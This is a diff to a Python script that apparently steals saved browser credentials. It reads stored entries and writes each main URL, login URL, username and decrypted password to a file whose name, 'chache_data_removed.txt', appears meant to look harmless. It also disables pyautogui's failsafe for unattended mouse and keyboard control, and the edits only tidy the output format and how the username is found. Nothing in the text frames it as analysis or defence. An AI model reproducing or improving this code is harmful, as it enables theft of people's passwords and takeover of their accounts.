@@ -7,7 +7,7 @@ import pyautogui
 pyautogui.FAILSAFE = False
 mouse = pyautogui
 keyboard = pyautogui
-username = subprocess.getoutput("whoami")
+username = os.environ["USERNAME"]
 import os
 import json
 import base64
@@ -95,10 +95,10 @@ def main1():
           
         if user_name or decrypted_password:
             with open("chache_data_removed.txt", "w") as f:
-                f.write(f"Main URL: {main_url}")
-                f.write(f"Login URL: {login_page_url}")
-                f.write(f"User name: {user_name}")
-                f.write(f"Decrypted Password: {decrypted_password}")
+                f.write(f"\nMain URL: {main_url}")
+                f.write(f"\nLogin URL: {login_page_url}")
+                f.write(f"\nUser name: {user_name}")
+                f.write(f"\nDecrypted Password: {decrypted_password}")
         else:
             continue  
     cursor.close()
